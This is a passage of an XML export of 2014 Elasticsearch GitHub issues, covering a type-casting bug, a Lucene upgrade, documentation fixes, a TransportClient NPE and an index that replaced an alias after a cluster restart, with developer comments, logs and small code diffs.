</description><key id="43685253">7845</key><summary>java api - multiple dimension arrays of shorts are casted to multiple dimension arrays of floats</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/jpountz/following{/other_user}', u'events_url': u'https://api.github.com/users/jpountz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/jpountz/orgs', u'url': u'https://api.github.com/users/jpountz', u'gists_url': u'https://api.github.com/users/jpountz/gists{/gist_id}', u'html_url': u'https://github.com/jpountz', u'subscriptions_url': u'https://api.github.com/users/jpountz/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/299848?v=4', u'repos_url': u'https://api.github.com/users/jpountz/repos', u'received_events_url': u'https://api.github.com/users/jpountz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/jpountz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'jpountz', u'type': u'User', u'id': 299848, u'followers_url': u'https://api.github.com/users/jpountz/followers'}</assignee><reporter username="">maximenay</reporter><labels /><created>2014-09-23T21:16:48Z</created><updated>2014-10-09T12:27:56Z</updated><resolved>2014-10-09T12:27:56Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-29T17:05:51Z" id="57193323">@jpountz could you take a look please?
</comment><comment author="jpountz" created="2014-10-08T15:41:33Z" id="58378283">I don't think this caused bugs since all short values can be represented as a float, but it's indeed wrong. I just opened a pull request: #8025
</comment><comment author="maximenay" created="2014-10-08T17:09:21Z" id="58391884">This is problematic when you get your data expecting a short and actually get a float. At least with the java API.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Upgrade to Lucene 4.10.1 snapshot</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7844</link><project id="" key="" /><description>Upgrades to a snapshot release of 4.10.1, hopefully sidestepping the 1.8.0_20 JVM bug we've been hitting in our builds recently after we upgraded to 4.10.0.  This also gives us test coverage of the upcoming Lucene point release...

Closes #7905
</description><key id="43684775">7844</key><summary>Upgrade to Lucene 4.10.1 snapshot</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/mikemccand/following{/other_user}', u'events_url': u'https://api.github.com/users/mikemccand/events{/privacy}', u'organizations_url': u'https://api.github.com/users/mikemccand/orgs', u'url': u'https://api.github.com/users/mikemccand', u'gists_url': u'https://api.github.com/users/mikemccand/gists{/gist_id}', u'html_url': u'https://github.com/mikemccand', u'subscriptions_url': u'https://api.github.com/users/mikemccand/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/796508?v=4', u'repos_url': u'https://api.github.com/users/mikemccand/repos', u'received_events_url': u'https://api.github.com/users/mikemccand/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/mikemccand/starred{/owner}{/repo}', u'site_admin': False, u'login': u'mikemccand', u'type': u'User', u'id': 796508, u'followers_url': u'https://api.github.com/users/mikemccand/followers'}</assignee><reporter username="">mikemccand</reporter><labels><label>:Core</label><label>upgrade</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-23T21:12:41Z</created><updated>2015-08-25T13:25:44Z</updated><resolved>2014-09-24T17:11:16Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rmuir" created="2014-09-23T22:00:22Z" id="56596885">Looks good. I thought the virus scanner would have to be disabled everywhere. Do you have an idea if the two problems are real bugs or just test bugs?
</comment><comment author="rjernst" created="2014-09-23T22:10:41Z" id="56598194">This looks good.  I see you have a 1.4 beta label here. Does that mean you are planning on changing the 1.4 branch to use this as well?  I just want to make there is no chance we accidentally release with that?  Seems like before release we should remove the repository too.
</comment><comment author="mikemccand" created="2014-09-24T08:47:44Z" id="56641552">&gt; I thought the virus scanner would have to be disabled everywhere. 

In fact I had to re-disable it: tests did fail (sometimes).

&gt; I see you have a 1.4 beta label here.

Yeah, I think we must upgrade to Lucene 4.10.1 before releasing, else users may hit this nasty 1.8.0_20 JVM bug.

&gt;  I just want to make there is no chance we accidentally release with that? Seems like before release we should remove the repository too.

I agree: I pushed changes to dev-tools/build_release.py that peek at pom.xml and make sure we are not pointing to the snapshots repository, and that the lucene version is not a snapshot.
</comment><comment author="mikemccand" created="2014-09-24T08:50:56Z" id="56641885">&gt;  Do you have an idea if the two problems are real bugs or just test bugs?

One of them (DistributorDirectoryTest) is a test bug: it extends BaseDirectoryTestCase, but in its getDirectory() method it's using MockDirectoryWrappers which BaseDirectoryTestCase does not "support", since it assumes/requires .deleteFile will succeed ... maybe the test should remove the MockDirectoryWrapper when it sees it... not sure.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>GeoJSON is lon,lat not lat,lon</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7843</link><project id="" key="" /><description>Although emphasized in the text, the example was backwards.
</description><key id="43675344">7843</key><summary>GeoJSON is lon,lat not lat,lon</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">thomdixon</reporter><labels><label>docs</label></labels><created>2014-09-23T19:54:12Z</created><updated>2014-09-28T09:06:27Z</updated><resolved>2014-09-28T09:06:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-25T17:03:04Z" id="56850029">Hi @thomdixon 

Good catch. Please could I ask you to sign the CLA so that I can merge your changes in?
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="thomdixon" created="2014-09-25T17:12:29Z" id="56851360">@clintongormley done! If you need a link to a hosted copy of the PDF, let me know! Thanks!
</comment><comment author="clintongormley" created="2014-09-28T09:06:27Z" id="57079578">thanks @thomdixon - merged
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Improve sentence structure</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7842</link><project id="" key="" /><description /><key id="43674616">7842</key><summary>Improve sentence structure</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">c4urself</reporter><labels><label>docs</label></labels><created>2014-09-23T19:47:33Z</created><updated>2014-09-28T09:07:51Z</updated><resolved>2014-09-28T09:07:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-25T17:03:52Z" id="56850149">Hi @c4urself 

Sounds good. Please could I ask you to sign the CLA so that I can merge your changes in?
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="c4urself" created="2014-09-26T22:50:34Z" id="57030496">Done.
</comment><comment author="clintongormley" created="2014-09-28T09:07:24Z" id="57079599">thanks @c4urself - merged
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update documentation related to fielddata eviction behavior</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7841</link><project id="" key="" /><description>As noted in https://groups.google.com/forum/#!topic/elasticsearch/0sSYSFfmmXM the following page needs to be corrected: http://www.elasticsearch.org/guide/en/elasticsearch/guide/current/_limiting_memory_usage.html.  

On the second issue, potential deprecation of indices.fielddata.cache.expire, I think deprecating that setting would be the wrong thing to do.  
</description><key id="43667800">7841</key><summary>Update documentation related to fielddata eviction behavior</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">craigwi</reporter><labels><label>discuss</label></labels><created>2014-09-23T18:47:23Z</created><updated>2014-10-29T14:22:16Z</updated><resolved>2014-10-29T14:22:16Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-10-29T14:22:15Z" id="60931757">Hi @craigwi 

Thanks for the issue, but I think this info is too low-level for the Definitive Guide.  The book is about explaining guiding principles, rather than the current implementation in the code (which can change at any time).
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Aggregations: NPE in SignificanceHeuristicStreams.read while deserializing response</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7840</link><project id="" key="" /><description>This is caused by the TransportClient failing to register a module that is now required to deserialize responses correctly.
The fix is to add this line to the constructor:

```
    modules.add(new SignificantTermsHeuristicModule());
```

Thanks to Felipe Hummel for reporting the error and providing a failing test case here: https://groups.google.com/forum/#!topic/elasticsearch/R42Nyyfr73I
</description><key id="43654032">7840</key><summary>Aggregations: NPE in SignificanceHeuristicStreams.read while deserializing response</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/markharwood/following{/other_user}', u'events_url': u'https://api.github.com/users/markharwood/events{/privacy}', u'organizations_url': u'https://api.github.com/users/markharwood/orgs', u'url': u'https://api.github.com/users/markharwood', u'gists_url': u'https://api.github.com/users/markharwood/gists{/gist_id}', u'html_url': u'https://github.com/markharwood', u'subscriptions_url': u'https://api.github.com/users/markharwood/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/170925?v=4', u'repos_url': u'https://api.github.com/users/markharwood/repos', u'received_events_url': u'https://api.github.com/users/markharwood/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/markharwood/starred{/owner}{/repo}', u'site_admin': False, u'login': u'markharwood', u'type': u'User', u'id': 170925, u'followers_url': u'https://api.github.com/users/markharwood/followers'}</assignee><reporter username="">markharwood</reporter><labels><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-23T16:48:57Z</created><updated>2014-09-24T12:17:18Z</updated><resolved>2014-09-24T12:09:32Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2014-09-24T09:01:47Z" id="56643055">I think since the SignificantTermsHeuristicModule is just for use in the Aggregations we should make TransportAggregationModule implement SpawnModules and implement the spawnModules method as follows:

```
    @Override
    public Iterable&lt;? extends Module&gt; spawnModules() {
        return ImmutableList.of(new SignificantTermsHeuristicModule());
    }
```
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Merge pull request #1 from elasticsearch/master</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7839</link><project id="" key="" /><description>merge
</description><key id="43643220">7839</key><summary>Merge pull request #1 from elasticsearch/master</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">thihy</reporter><labels /><created>2014-09-23T15:24:39Z</created><updated>2014-09-23T15:25:21Z</updated><resolved>2014-09-23T15:25:21Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Index overwrites alias</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7838</link><project id="" key="" /><description>using 1.3.2
here is the scenario:
- i have an alias which points to an index
- i constantly write data to that alias
- the cluster (all 4 nodes) failed with an oome (because of an aggregation with lots of nested cardinalities) and i restarted all nodes at once
- i continue to write data while cluster is being restarted
- after restart i see that the alias is gone and is replaced by an index with the same name
</description><key id="43637349">7838</key><summary>Index overwrites alias</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/bleskes/following{/other_user}', u'events_url': u'https://api.github.com/users/bleskes/events{/privacy}', u'organizations_url': u'https://api.github.com/users/bleskes/orgs', u'url': u'https://api.github.com/users/bleskes', u'gists_url': u'https://api.github.com/users/bleskes/gists{/gist_id}', u'html_url': u'https://github.com/bleskes', u'subscriptions_url': u'https://api.github.com/users/bleskes/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/1006375?v=4', u'repos_url': u'https://api.github.com/users/bleskes/repos', u'received_events_url': u'https://api.github.com/users/bleskes/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/bleskes/starred{/owner}{/repo}', u'site_admin': False, u'login': u'bleskes', u'type': u'User', u'id': 1006375, u'followers_url': u'https://api.github.com/users/bleskes/followers'}</assignee><reporter username="">OlegYch</reporter><labels><label>bug</label></labels><created>2014-09-23T14:40:01Z</created><updated>2015-11-22T20:25:33Z</updated><resolved>2015-11-22T20:25:33Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-29T16:09:40Z" id="57185070">@bleskes any ideas?
</comment><comment author="imotov" created="2014-10-01T08:38:43Z" id="57434555">I was able to reproduce it but I am not sure what would be the proper way to resolve it. This is somewhat similar to #7915 but with different mechanism of introducing an the index. Basically, what happens here is during split brain one part of the cluster creates an alias A, while another part of the cluster which is not aware of the alias A gets an indexing request for A and automatically creates an the index with the name A. When split brain is fixed the index A is imported into the cluster state without checking if alias with such name already exists or not, and now we have index A and alias A. Because we during most search and indexing operations we check index first, the alias A is getting shadowed by the index A for most operations.
</comment><comment author="OlegYch" created="2014-10-01T09:12:00Z" id="57437779">the thing is that alias existed (for quite a while) before cluster was restarted
additionally i have gateway.expected_nodes: 4 and discovery.zen.minimum_master_nodes: 3 which should prevent splitbrain from occuring, afaik
</comment><comment author="imotov" created="2014-10-01T09:18:38Z" id="57438493">@OlegYch could you grep log file on all your services for the line like this:

```
[YOU-ALIAS-NAME-HERE] creating index, cause [auto(index api)], shards [5]/[1], mappings []
```

and check what was going on on this server before this line.
</comment><comment author="OlegYch" created="2014-10-04T20:54:48Z" id="57918216">here is the log:

```
[2014-09-22 15:16:50,976][INFO ][gateway                  ] [node4] recovered [36] indices into cluster_state
[2014-09-22 15:16:52,246][DEBUG][action.admin.indices.create] [node4] [users_idx_5327710bc8f2ba065dc4828b] failed to create
org.elasticsearch.indices.InvalidIndexNameException: [users_idx_5327710bc8f2ba065dc4828b] Invalid index name [users_idx_5327710bc8f2ba065dc4828b], already exists as alias
at org.elasticsearch.cluster.metadata.MetaDataCreateIndexService.validateIndexName(MetaDataCreateIndexService.java:189)
at org.elasticsearch.cluster.metadata.MetaDataCreateIndexService.validate(MetaDataCreateIndexService.java:525)
at org.elasticsearch.cluster.metadata.MetaDataCreateIndexService.access$100(MetaDataCreateIndexService.java:87)
at org.elasticsearch.cluster.metadata.MetaDataCreateIndexService$2.execute(MetaDataCreateIndexService.java:224)
at org.elasticsearch.cluster.service.InternalClusterService$UpdateTask.run(InternalClusterService.java:328)
at org.elasticsearch.common.util.concurrent.PrioritizedEsThreadPoolExecutor$TieBreakingPrioritizedRunnable.run(PrioritizedEsThreadPoolExecutor.java:153)
at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
at java.lang.Thread.run(Thread.java:745)
[2014-09-22 15:17:05,195][DEBUG][action.admin.indices.create] [node4] [users_idx_5327710bc8f2ba065dc4828b] failed to create
org.elasticsearch.indices.InvalidIndexNameException: [users_idx_5327710bc8f2ba065dc4828b] Invalid index name [users_idx_5327710bc8f2ba065dc4828b], already exists as alias
at org.elasticsearch.cluster.metadata.MetaDataCreateIndexService.validateIndexName(MetaDataCreateIndexService.java:189)
at org.elasticsearch.cluster.metadata.MetaDataCreateIndexService.validate(MetaDataCreateIndexService.java:525)
at org.elasticsearch.cluster.metadata.MetaDataCreateIndexService.access$100(MetaDataCreateIndexService.java:87)
at org.elasticsearch.cluster.metadata.MetaDataCreateIndexService$2.execute(MetaDataCreateIndexService.java:224)
at org.elasticsearch.cluster.service.InternalClusterService$UpdateTask.run(InternalClusterService.java:328)
at org.elasticsearch.common.util.concurrent.PrioritizedEsThreadPoolExecutor$TieBreakingPrioritizedRunnable.run(PrioritizedEsThreadPoolExecutor.java:153)
at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
at java.lang.Thread.run(Thread.java:745)
[2014-09-22 15:17:13,730][INFO ][cluster.metadata         ] [node4] [users_idx_5327710bc8f2ba065dc4828b] creating index, cause [auto(index api)], shards [5]/[1], mappings []
[2014-09-22 15:17:19,553][DEBUG][action.admin.indices.alias] [node4] failed to perform aliases
org.elasticsearch.indices.InvalidAliasNameException: [users_idx_5327710bc8f2ba065dc4828b_7] Invalid alias name [users_idx_5327710bc8f2ba065dc4828b], an index exists with the same name as the alias
at org.elasticsearch.cluster.metadata.AliasValidator.validateAlias(AliasValidator.java:102)
at org.elasticsearch.cluster.metadata.AliasValidator.validateAliasAction(AliasValidator.java:53)
at org.elasticsearch.cluster.metadata.MetaDataIndexAliasesService$1.execute(MetaDataIndexAliasesService.java:77)
at org.elasticsearch.cluster.service.InternalClusterService$UpdateTask.run(InternalClusterService.java:328)
at org.elasticsearch.common.util.concurrent.PrioritizedEsThreadPoolExecutor$TieBreakingPrioritizedRunnable.run(PrioritizedEsThreadPoolExecutor.java:153)
at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
at java.lang.Thread.run(Thread.java:745)
[2014-09-22 15:17:34,679][DEBUG][action.admin.indices.alias] [node4] failed to perform aliases
org.elasticsearch.indices.InvalidAliasNameException: [users_idx_5327710bc8f2ba065dc4828b_7] Invalid alias name [users_idx_5327710bc8f2ba065dc4828b], an index exists with the same name as the alias
at org.elasticsearch.cluster.metadata.AliasValidator.validateAlias(AliasValidator.java:102)
at org.elasticsearch.cluster.metadata.AliasValidator.validateAliasAction(AliasValidator.java:53)
at org.elasticsearch.cluster.metadata.MetaDataIndexAliasesService$1.execute(MetaDataIndexAliasesService.java:77)
at org.elasticsearch.cluster.service.InternalClusterService$UpdateTask.run(InternalClusterService.java:328)
at org.elasticsearch.common.util.concurrent.PrioritizedEsThreadPoolExecutor$TieBreakingPrioritizedRunnable.run(PrioritizedEsThreadPoolExecutor.java:153)
at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
at java.lang.Thread.run(Thread.java:745)

```

only logs from one node mention creating that index
</comment><comment author="imotov" created="2014-10-04T20:57:56Z" id="57918291">@OlegYch is this a complete snippet or there was something between 2014-09-22 15:17:05,195 and 2014-09-22 15:17:13,730? If there was something else could you post (or email me) a complete log from this node?
</comment><comment author="OlegYch" created="2014-10-04T21:18:24Z" id="57918787">this is a complete snippet, though on this node earlier and on others there is also:

```
[2014-09-22 15:17:09,933][WARN ][repositories             ] [node1] failure updating cluster state
org.elasticsearch.repositories.RepositoryException: [prod] failed to create repository
      at org.elasticsearch.repositories.RepositoriesService.createRepositoryHolder(RepositoriesService.java:353)
      at org.elasticsearch.repositories.RepositoriesService.clusterChanged(RepositoriesService.java:238)
      at org.elasticsearch.cluster.service.InternalClusterService$UpdateTask.run(InternalClusterService.java:447)
      at org.elasticsearch.common.util.concurrent.PrioritizedEsThreadPoolExecutor$TieBreakingPrioritizedRunnable.run(PrioritizedEsThreadPoolExecutor.java:153)
      at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
      at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
      at java.lang.Thread.run(Thread.java:745)
Caused by: org.elasticsearch.common.inject.CreationException: Guice creation errors:

1) Error injecting constructor, org.elasticsearch.common.blobstore.BlobStoreException: Failed to create directory at [/home/crm-backup/es/prod]
  at org.elasticsearch.repositories.fs.FsRepository.&lt;init&gt;(Unknown Source)
  while locating org.elasticsearch.repositories.fs.FsRepository
  while locating org.elasticsearch.repositories.Repository

1 error
      at org.elasticsearch.common.inject.internal.Errors.throwCreationExceptionIfErrorsExist(Errors.java:344)
      at org.elasticsearch.common.inject.InjectorBuilder.injectDynamically(InjectorBuilder.java:178)
      at org.elasticsearch.common.inject.InjectorBuilder.build(InjectorBuilder.java:110)
      at org.elasticsearch.common.inject.InjectorImpl.createChildInjector(InjectorImpl.java:131)
      at org.elasticsearch.common.inject.ModulesBuilder.createChildInjector(ModulesBuilder.java:69)
      at org.elasticsearch.repositories.RepositoriesService.createRepositoryHolder(RepositoriesService.java:343)
      ... 6 more
Caused by: org.elasticsearch.common.blobstore.BlobStoreException: Failed to create directory at [/home/crm-backup/es/prod]
      at org.elasticsearch.common.blobstore.fs.FsBlobStore.&lt;init&gt;(FsBlobStore.java:54)
      at org.elasticsearch.repositories.fs.FsRepository.&lt;init&gt;(FsRepository.java:79)
      at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
      at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:57)
      at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
      at java.lang.reflect.Constructor.newInstance(Constructor.java:526)
      at org.elasticsearch.common.inject.DefaultConstructionProxyFactory$1.newInstance(DefaultConstructionProxyFactory.java:54)
      at org.elasticsearch.common.inject.ConstructorInjector.construct(ConstructorInjector.java:86)
      at org.elasticsearch.common.inject.ConstructorBindingImpl$Factory.get(ConstructorBindingImpl.java:98)
      at org.elasticsearch.common.inject.FactoryProxy.get(FactoryProxy.java:52)
      at org.elasticsearch.common.inject.ProviderToInternalFactoryAdapter$1.call(ProviderToInternalFactoryAdapter.java:45)
      at org.elasticsearch.common.inject.InjectorImpl.callInContext(InjectorImpl.java:837)
      at org.elasticsearch.common.inject.ProviderToInternalFactoryAdapter.get(ProviderToInternalFactoryAdapter.java:42)
      at org.elasticsearch.common.inject.Scopes$1$1.get(Scopes.java:57)
      at org.elasticsearch.common.inject.InternalFactoryToProviderAdapter.get(InternalFactoryToProviderAdapter.java:45)
      at org.elasticsearch.common.inject.InjectorBuilder$1.call(InjectorBuilder.java:200)
      at org.elasticsearch.common.inject.InjectorBuilder$1.call(InjectorBuilder.java:193)
      at org.elasticsearch.common.inject.InjectorImpl.callInContext(InjectorImpl.java:830)
      at org.elasticsearch.common.inject.InjectorBuilder.loadEagerSingletons(InjectorBuilder.java:193)
      at org.elasticsearch.common.inject.InjectorBuilder.injectDynamically(InjectorBuilder.java:175)
      ... 10 more
```
</comment><comment author="s1monw" created="2014-10-10T10:49:01Z" id="58640102">hey, so in your case there seem to be a clash between an alias and a dangling index. We do not check if an alias with the same name exists when we import dangling indices which we should likely log. Yet, for the sake of not loosing data we still would need to import the dangling index and rely on you as the user to either remove the index or delete the alias. does  this make sense?

@bleskes I think we should log it though maybe something like this:

``` Java
diff --git a/src/main/java/org/elasticsearch/gateway/local/state/meta/LocalGatewayMetaState.java b/src/main/java/org/elasticsearch/gateway/local/state/meta/LocalGatewayMetaState.
index 70b5af1..58a7483 100644
--- a/src/main/java/org/elasticsearch/gateway/local/state/meta/LocalGatewayMetaState.java
+++ b/src/main/java/org/elasticsearch/gateway/local/state/meta/LocalGatewayMetaState.java
@@ -284,6 +284,9 @@ public class LocalGatewayMetaState extends AbstractComponent implements ClusterS
             if (autoImportDangled.shouldImport() &amp;&amp; !danglingIndices.isEmpty()) {
                 final List&lt;IndexMetaData&gt; dangled = Lists.newArrayList();
                 for (String indexName : danglingIndices.keySet()) {
+                    if (event.state().metaData().aliases().containsKey(indexName)) {
+                        logger.warn("An alias with the same name as a dangling index already exists. Please either remove the index or the alias named [{}] ", indexName);
+                    }
                     IndexMetaData indexMetaData = loadIndex(indexName);
                     if (indexMetaData == null) {
                         logger.debug("failed to find state for dangling index [{}]", indexName);
```
</comment><comment author="bleskes" created="2014-10-10T11:26:18Z" id="58643220">@s1monw sounds about right. I'll make a PR for this.
</comment><comment author="OlegYch" created="2014-10-10T12:52:13Z" id="58650980">i'm not sure how that index came to existence or became dangling
i've always had an alias with the same name
looks like for some reason information about aliases was lost at some point but the cluster was accepting writes and autocreated index in place of alias, so the question is how might that happen
</comment><comment author="clintongormley" created="2014-10-10T13:12:58Z" id="58653218">@OlegYch you mentioned an OOM condition. When that happens, the node is in an undefined state - may have corrupted the local cluster state or something like that.
</comment><comment author="bleskes" created="2014-10-11T16:55:39Z" id="58756261">I've created the PR fixing the issue @s1monw mentioned ( https://github.com/elasticsearch/elasticsearch/pull/8059 ) . Nevertheless, I don't think it explains what were seeing here because we don't see any logging of importing a dangling index (which is logged under info: https://github.com/elasticsearch/elasticsearch/blob/master/src/main/java/org/elasticsearch/gateway/local/state/meta/LocalAllocateDangledIndices.java#L140 ) .

I'm curious as to why we have this log message:

```
[2014-09-22 15:17:19,553][DEBUG][action.admin.indices.alias] [node4] failed to perform aliases
org.elasticsearch.indices.InvalidAliasNameException: [users_idx_5327710bc8f2ba065dc4828b_7] Invalid alias name [users_idx_5327710bc8f2ba065dc4828b], an index exists with the same name as the alias
at org.elasticsearch.cluster.metadata.AliasValidator.validateAlias(AliasValidator.java:102)
```

This indicates an alias call. Maybe the alias was accidentally removed and then failed to be re-added?
</comment><comment author="OlegYch" created="2014-10-11T17:11:09Z" id="58756840">i'm not sure if there were any imports of dangling indexes, unfortunately logs are now lost
otoh, i'm pretty sure we never removed the alias
i can see how OOM could have caused havoc
is -XX:OnOutOfMemoryError="kill -9 %p" the only way to ensure this doesn't happen?
</comment><comment author="bleskes" created="2014-10-13T11:39:08Z" id="58880592">&gt; is -XX:OnOutOfMemoryError="kill -9 %p" the only way to ensure this doesn't happen?

That's OK to do. Note that this will force close the node the cluster will respond by rebalancing data around.
</comment><comment author="clintongormley" created="2015-11-21T19:09:38Z" id="158672982">@bleskes can we close this one?
</comment><comment author="bleskes" created="2015-11-22T20:25:33Z" id="158795303">@clintongormley I think so, the chances of finding out what happened are really slim. 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add a listener thread pool</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7837</link><project id="" key="" /><description>Today, when executing an action (mainly when using the Java API), a listener threaded flag can be set to true in order to execute the listener on a different thread pool. Today, this thread pool is the generic thread pool, which is cached. This can create problems for Java clients (mainly) around potential thread explosion.
Introduce a new thread pool called listener, that is fixed sized and defaults to the half the cores maxed at 10, and use it where listeners are executed.
</description><key id="43635769">7837</key><summary>Add a listener thread pool</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kimchy</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-23T14:27:03Z</created><updated>2015-06-07T10:32:37Z</updated><resolved>2014-09-25T09:25:48Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-09-23T16:22:37Z" id="56547302">LGTM
</comment><comment author="s1monw" created="2014-09-24T19:57:55Z" id="56729042">LGTM 
